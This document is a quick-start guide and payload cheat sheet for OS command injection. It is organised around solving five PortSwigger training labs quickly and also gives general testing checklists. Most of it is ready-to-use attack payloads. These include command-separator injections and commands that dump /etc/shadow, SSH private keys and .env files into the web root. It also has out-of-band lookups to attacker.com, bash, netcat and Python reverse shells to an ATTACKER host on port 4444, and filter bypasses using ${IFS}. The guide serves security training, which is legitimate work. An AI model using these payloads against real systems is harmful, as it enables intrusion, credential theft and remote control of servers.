# OS Command Injection - Quick Start Guide

## 🎯 5-Minute Quick Test

### Step 1: Test Time-Based Detection (2 minutes)

**Goal**: Confirm vulnerability exists through response delay

```bash
# Inject this payload in any parameter:
||sleep 5||

# Examples:
# URL: http://target.com/page?id=1||sleep 5||
# POST: email=test||sleep 5||
```

**Expected Result**: Response takes ~5 seconds
**✅ If delayed**: VULNERABLE! Proceed to Step 2
**❌ If not delayed**: Try alternative separators

### Step 2: Try Alternative Separators (1 minute)

```bash
;sleep 5;
|sleep 5|
`sleep 5`
$(sleep 5)
%0asleep 5%0a
```

### Step 3: Extract Data (2 minutes)

**If output is reflected:**
```bash
|whoami
|id
|hostname
```

**If blind (no output):**
```bash
# Write to web directory
||whoami>/var/www/html/out.txt||

# Then retrieve
GET /out.txt
```

**If out-of-band works:**
```bash
||nslookup `whoami`.burpcollaborator.net||
```

---

## 🚀 Complete PortSwigger Labs Speed Run

### Lab 1: OS command injection, simple case
**Time**: 1 minute | **Difficulty**: Apprentice

```
1. Go to any product page
2. Click "Check stock"
3. Intercept in Burp
4. Change: storeId=1|whoami
5. Send - observe username in response
✅ Lab solved!
```

**Alternative payloads:**
- `storeId=1;whoami`
- `storeId=1||whoami||`
- `storeId=1$(whoami)`

---

### Lab 2: Blind OS command injection with time delays
**Time**: 1 minute | **Difficulty**: Practitioner

```
1. Go to feedback page
2. Fill form and submit
3. Intercept in Burp
4. Change: email=x||ping+-c+10+127.0.0.1||
5. Send - observe ~10 second delay
✅ Lab solved!
```

**Why it works:**
- `ping -c 10` sends 10 packets = ~10 seconds
- `||` chains commands even if first fails

---

### Lab 3: Blind OS command injection with output redirection
**Time**: 2 minutes | **Difficulty**: Practitioner

```
1. Submit feedback with payload in email field
2. Payload: ||whoami>/var/www/images/output.txt||
3. Go to any product image
4. Intercept image request in Burp
5. Change filename parameter to: output.txt
6. Observe username in response
✅ Lab solved!
```

**Step-by-step:**
```http
POST /feedback/submit
email=||whoami>/var/www/images/output.txt||

GET /image?filename=output.txt
```

---

### Lab 4: Blind OS command injection with out-of-band interaction
**Time**: 2 minutes | **Difficulty**: Practitioner | **Requires**: Burp Pro

```
1. Open Burp Collaborator client
2. Copy payload to clipboard
3. Submit feedback
4. Intercept in Burp
5. Payload: email=x||nslookup+BURP-COLLABORATOR-SUBDOMAIN||
6. Send request
7. Poll Collaborator - observe DNS query
✅ Lab solved!
```

**Quick method:**
- Right-click email value → "Insert Collaborator payload"
- Wrap with: `x||nslookup PAYLOAD||`

---

### Lab 5: Blind OS command injection with out-of-band data exfiltration
**Time**: 2 minutes | **Difficulty**: Practitioner | **Requires**: Burp Pro

```
1. Copy Burp Collaborator subdomain
2. Submit feedback
3. Intercept in Burp
4. Payload: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
5. Send request
6. Wait 5 seconds
7. Poll Collaborator
8. DNS query shows: USERNAME.burpcollaborator.net
9. Submit USERNAME as solution
✅ Lab solved!
```

**Key technique**: Backticks execute command and insert output into domain

---

## 📋 Decision Tree

```
Can you see command output in response?
│
├─ YES → Direct injection
│   └─ Payload: |whoami
│   └─ Time: 30 seconds
│
└─ NO → Blind injection
    │
    ├─ Can you access file system?
    │   └─ YES → Output redirection
    │       └─ Payload: ||whoami>/var/www/html/out.txt||
    │       └─ Time: 1 minute
    │
    └─ NO → Out-of-band or Time-based
        │
        ├─ Outbound connections allowed?
        │   └─ YES → Out-of-band
        │       └─ Payload: ||nslookup attacker.com||
        │       └─ Time: 1 minute
        │
        └─ NO → Time-based
            └─ Payload: ||sleep 5||
            └─ Time: 30 seconds
```

---

## 🔥 Most Effective Payloads

### Universal Detection (Test These First)

```bash
# 1. Time-based (most reliable)
||sleep 5||

# 2. Output-based (fastest if works)
|whoami

# 3. Out-of-band (bypasses filters)
||nslookup attacker.com||
```

### Platform-Specific

**Linux/Unix:**
```bash
||sleep 5||
||ping -c 5 127.0.0.1||
|whoami
|id
|uname -a
```

**Windows:**
```bash
||timeout /t 5||
||ping -n 6 127.0.0.1||
|whoami
& whoami &
```

---

## ⚡ Common Mistakes to Avoid

| Mistake | Solution |
|---------|----------|
| ❌ Using wrong ping flag | ✅ Linux: `-c` Windows: `-n` |
| ❌ Not URL encoding when needed | ✅ Use `+` for spaces or `%20` |
| ❌ Testing only one parameter | ✅ Test ALL inputs systematically |
| ❌ Too short time delays | ✅ Use 5+ seconds for clarity |
| ❌ Not checking web-accessible paths | ✅ Try `/var/www/html/`, `/var/www/images/` |
| ❌ Forgetting to poll Collaborator | ✅ Wait 5 seconds, then poll |

---

## 🎓 Burp Suite Workflow

### Fastest Method

```
1. Intercept request → Ctrl+R (Send to Repeater)
2. Modify parameter: ||sleep 5||
3. Send → Check response time
4. If delayed → Vulnerable!
5. Extract data with appropriate technique
```

### Systematic Testing

```
Tab 1 (Time-based):
  email=test||sleep 5||
  → Check response timer

Tab 2 (Output):
  email=test|whoami
  → Search response (Ctrl+F)

Tab 3 (OOB):
  email=test||nslookup burpcollaborator.net||
  → Check Collaborator tab
```

---

## 🛠️ Essential Commands

### Enumeration

```bash
# System info
whoami              # Current user (30 sec)
id                  # User ID (30 sec)
hostname            # System name (30 sec)
uname -a            # Full system info (1 min)

# Quick wins
cat /etc/passwd     # User list (1 min)
cat /etc/hostname   # Hostname (30 sec)
env                 # Environment vars (1 min)
ps aux              # Running processes (1 min)
```

### File Exfiltration

```bash
# Read sensitive files
||cat /etc/passwd>/var/www/html/passwd.txt||
||cat /etc/shadow>/var/www/html/shadow.txt||
||cat ~/.ssh/id_rsa>/var/www/html/key.txt||

# Application files
||cat /var/www/html/config.php>/var/www/html/config.txt||
||cat .env>/var/www/html/env.txt||
```

### Reverse Shell (Advanced)

```bash
# Bash reverse shell
||bash -i >& /dev/tcp/ATTACKER/4444 0>&1||

# Netcat
||nc ATTACKER 4444 -e /bin/bash||

# Python
||python -c 'import socket,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/bash")'||
```

---

## 📊 Lab Completion Times

| Lab | Difficulty | Minimum Time | Average Time |
|-----|------------|--------------|--------------|
| Lab 1: Simple case | Apprentice | 1 min | 2 min |
| Lab 2: Time delays | Practitioner | 1 min | 3 min |
| Lab 3: Output redirection | Practitioner | 2 min | 5 min |
| Lab 4: OOB interaction | Practitioner | 2 min | 4 min |
| Lab 5: OOB exfiltration | Practitioner | 2 min | 5 min |
| **Total** | | **8 min** | **19 min** |

---

## 🎯 Testing Checklist

### Initial Detection (5 minutes)

- [ ] Test time-based: `||sleep 5||`
- [ ] Test output-based: `|whoami`
- [ ] Test out-of-band: `||nslookup attacker.com||`
- [ ] Try multiple separators: `;`, `|`, `||`, `&&`, `&`
- [ ] Test all parameters (GET, POST, headers)

### Exploitation (10 minutes)

- [ ] Identify OS (Linux vs Windows)
- [ ] Extract username: `whoami`
- [ ] Read `/etc/passwd` or equivalent
- [ ] Check privileges: `id` or `whoami /all`
- [ ] Enumerate network: `ifconfig` or `ipconfig`
- [ ] Find sensitive files: config files, SSH keys

### Documentation (5 minutes)

- [ ] Screenshot vulnerable request
- [ ] Screenshot response showing exploitation
- [ ] Document exact payload used
- [ ] Note which parameter was vulnerable
- [ ] Record impact (privilege level, data accessed)

---

## 🚨 When You're Stuck

### Troubleshooting Guide

**Problem**: No response delay with `sleep` command

**Solutions**:
```bash
# Try ping instead
||ping -c 5 127.0.0.1||  # Linux
||ping -n 6 127.0.0.1||  # Windows

# Try timeout
||timeout 5||

# Check if command is blocked
||tim${IFS}eout 5||      # Space bypass
||sle${IFS}ep 5||
```

---

**Problem**: Can't find output file

**Solutions**:
```bash
# Try common web paths
||whoami>/var/www/html/out.txt||
||whoami>/var/www/images/out.txt||
||whoami>/usr/share/nginx/html/out.txt||
||whoami>/tmp/out.txt||

# Test with echo first
||echo test123>/var/www/html/test.txt||
```

---

**Problem**: No DNS interaction

**Solutions**:
```bash
# Try HTTP instead
||curl http://burpcollaborator.net||
||wget http://burpcollaborator.net||

# Check if nslookup exists
||which nslookup||
||dig burpcollaborator.net||
||host burpcollaborator.net||
```

---

## 📚 Learn More

**Next steps after quick start:**
- Read complete lab guide: `os-command-injection-portswigger-labs-complete.md`
- Study bypass techniques: `os-command-injection-cheat-sheet.md`
- Practice on other platforms: HackTheBox, TryHackMe
- Explore tool usage: Commix automation

**Key resources:**
- PortSwigger: https://portswigger.net/web-security/os-command-injection
- OWASP: https://owasp.org/www-community/attacks/Command_Injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

---

## 💡 Pro Tips

1. **Always test time-based first** - It works even with strict filtering
2. **Use Burp Repeater** - Faster than re-submitting forms
3. **Test all parameters** - Don't stop at the obvious ones
4. **URL encode when needed** - But not always necessary in POST body
5. **Check response time** - Bottom right in Burp Repeater
6. **Use tab groups** - Test multiple techniques simultaneously
7. **Start simple** - Complex payloads can trigger WAFs
8. **Document everything** - Screenshot as you go
9. **Think like a defender** - What would you log/block?
10. **Practice regularly** - Speed comes from repetition

---

## 🏆 Speed Run Challenge

**Can you complete all 5 labs in under 10 minutes?**

Target times:
- Lab 1: 1 minute
- Lab 2: 1 minute
- Lab 3: 2 minutes
- Lab 4: 2 minutes
- Lab 5: 2 minutes
- Buffer: 2 minutes
- **Total: 10 minutes**

**Tips for speed:**
- Pre-configure Burp Repeater tabs
- Copy payloads to clipboard beforehand
- Use keyboard shortcuts (Ctrl+R, Ctrl+Space)
- Don't wait for full responses if you see the data
- Use Burp's "Insert Collaborator payload" shortcut

---

*Master OS command injection in minutes, not hours*
*Last updated: 2025*
